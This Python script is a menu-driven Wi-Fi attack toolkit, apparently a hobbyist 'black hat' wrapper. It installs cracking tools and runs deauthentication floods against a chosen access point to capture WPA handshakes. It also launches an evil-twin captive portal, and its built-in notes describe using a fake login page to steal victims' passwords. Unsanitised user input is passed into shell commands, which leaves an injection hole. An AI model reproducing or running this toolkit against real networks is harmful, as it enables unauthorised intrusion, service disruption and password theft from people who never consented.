# coding: utf-8
import os
import sys
import time
import subprocess

# --- UI CONSTANTS ---
GREEN = "\033[1;32m"
BLUE = "\033[1;34m"
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
RESET = "\033[0m"

# --- SYSTEM SETTINGS ---
VERSION = "2.0.1-STABLE"
CODENAME = "WIFI-CRACK-OS"

def header():
    os.system("clear")
    print(f"""{GREEN}
 ██████╗ ███████╗    ██████╗ ███████╗██████╗ ██╗  ██╗
██╔═══██╗██╔════╝    ██╔══██╗██╔════╝██╔══██╗██║ ██╔╝
██║   ██║███████╗    ██║  ██║█████╗  ██████╔╝█████╔╝ 
██║   ██║╚════██║    ██║  ██║██╔══╝  ██╔══██╗██╔═██╗ 
╚██████╔╝███████║    ██████╔╝███████╗██║  ██║██║  ██╗
 ╚═════╝ ╚══════╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
 {BLUE}>> SYSTEM CORE: {CODENAME} | VERSION: {VERSION} <<
 {YELLOW}>> DEVELOPER: BlackHatHacker-Ankit <<{RESET}""")



def run_command(command):
    """Run a shell command and stream output live."""
    process = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    for line in process.stdout:
        print(line, end="")

    process.wait()
    return process.returncode


def install_system():
    header()
    print(f"\n{YELLOW}[!] INITIALIZING SYSTEM INSTALLATION...{RESET}")

    packages = [
        "aircrack-ng", "crunch", "xterm", "wordlists", "reaver",
        "pixiewps", "bully", "wifite", "airgeddon", "dnsmasq",
        "hostapd", "lighttpd", "php-cgi"
    ]

    # Update package list first (recommended)
    print(f"{BLUE}[*] Updating package list...{RESET}")
    if run_command(["sudo", "apt-get", "update"]) != 0:
        print(f"{RED}[!] Failed to update package list.{RESET}")
        return

    for pkg in packages:
        print(f"\n{BLUE}[*] Installing {pkg}...{RESET}")
        result = run_command(["sudo", "apt-get", "install", "-y", pkg])
        if result != 0:
            print(f"{RED}[!] Failed to install {pkg}{RESET}")
        else:
            print(f"{GREEN}[+] {pkg} installed successfully.{RESET}")

    # Handle Rockyou
    rockyou_path = "/usr/share/wordlists/rockyou.txt"
    if not os.path.exists(rockyou_path):
        print(f"\n{YELLOW}[*] Extracting rockyou wordlist...{RESET}")
        run_command(["sudo", "gzip", "-d", "/usr/share/wordlists/rockyou.txt.gz"])

    print(f"\n{GREEN}[+] SYSTEM READY. Press Enter to boot.{RESET}")
    input()


def get_tool_info(choice):
    info = {
        "1": {
            "name": "Monitor Mode",
            "tools": "airmon-ng",
            "workflow": "Puts your Wi-Fi card into 'listening' mode. Essential for seeing packets you aren't normally supposed to see.",
            "impact": "Disconnects you from your current Wi-Fi internet."
        },
        "4": {
            "name": "Handshake Capture",
            "tools": "airodump-ng / aireplay-ng",
            "workflow": "1. Scan for targets -> 2. Target specific BSSID -> 3. Send Deauth packets to force a reconnect -> 4. Capture the encrypted 4-way handshake.",
            "impact": "Kicks target users off their Wi-Fi for 2-5 seconds."
        },
        "5": {
            "name": "Evil Twin / Captive Portal",
            "tools": "airgeddon / hostapd / dnsmasq",
            "workflow": "1. Create fake AP with same name -> 2. Deauth real AP -> 3. Victim joins fake AP -> 4. Victim is shown a fake login page -> 5. Victim types password -> 6. Script verifies password.",
            "impact": "High. Steals password via social engineering."
        }
    }
    return info.get(choice, None)

def main_menu():
    header()
    print(f"""
{BLUE}OS MODULES:{RESET}
(1)  Monitor Mode (Start/Stop)      (6)  Wordlist Generator (Crunch)
(2)  Network Scanner (Airodump)     (7)  Offline Cracker (Aircrack)
(3)  WPS Attack (Pixie Dust)        (8)  System Update/Install
(4)  Handshake Capturer             (9)  Tool Documentation & Workflow
(5)  EVIL TWIN (Captive Portal)     (00) Shutdown System
-----------------------------------------------------------------------""")
    
    choice = input(f"{GREEN}┌──({RED}root@{CODENAME}{GREEN})─[{BLUE}~{GREEN}]\n└─$ {RESET}").strip()

    if choice == "1":
        mode = input("1. Start Monitor | 2. Stop Monitor: ")
        if mode == "1":
            interface = input("Interface (wlan0): ")
            os.system(f"sudo airmon-ng start {interface} && sudo airmon-ng check kill")
        else:
            interface = input("Interface (wlan0mon): ")
            os.system(f"sudo airmon-ng stop {interface} && sudo service network-manager restart")
        main_menu()

    elif choice == "2":
        interface = input("Interface: ")
        print(f"{YELLOW}[!] Press CTRL+C to stop scanning...{RESET}")
        time.sleep(2)
        os.system(f"sudo airodump-ng {interface}")
        main_menu()

    elif choice == "4":
        interface = input("Interface: ")
        bssid = input("Target BSSID: ")
        channel = input("Target Channel: ")
        out = input("Save file name: ")
        print(f"{RED}[!] Opening Deauth window and Capture window...{RESET}")
        # Opens two xterms: one to capture, one to deauth
        os.system(f"xterm -e 'airodump-ng -c {channel} --bssid {bssid} -w {out} {interface}' &")
        os.system(f"xterm -e 'aireplay-ng -0 20 -a {bssid} {interface}' &")
        main_menu()

    elif choice == "5":
        print(f"{YELLOW}[*] Loading Airgeddon Core...{RESET}")
        time.sleep(1)
        os.system("sudo airgeddon")
        main_menu()

    elif choice == "8":
        install_system()
        main_menu()

    elif choice == "9":
        header()
        print(f"{BLUE}--- SYSTEM DOCUMENTATION ---{RESET}")
        item = input("Enter option number to see details (1, 4, 5): ")
        data = get_tool_info(item)
        if data:
            print(f"\n{GREEN}NAME: {data['name']}")
            print(f"{YELLOW}TOOLS USED: {data['tools']}")
            print(f"{BLUE}WORKFLOW: {data['workflow']}{RESET}")
        else:
            print(f"{RED}No documentation for this module.{RESET}")
        input("\nPress Enter...")
        main_menu()

    elif choice == "00":
        print(f"{RED}Shutting down core...{RESET}")
        sys.exit()

    else:
        print(f"{RED}Command not recognized.{RESET}")
        time.sleep(1)
        main_menu()

if __name__ == "__main__":
    if os.getuid() != 0:
        print(f"{RED}[!] ERROR: Access Denied. Run as sudo.{RESET}")
        sys.exit()
    
    # Prompt for installation on first run
    header()
    init = input(f"{YELLOW}[?] Perform system install/update first? (y/n): {RESET}")
    if init.lower() == 'y':
        install_system()
    

    main_menu()
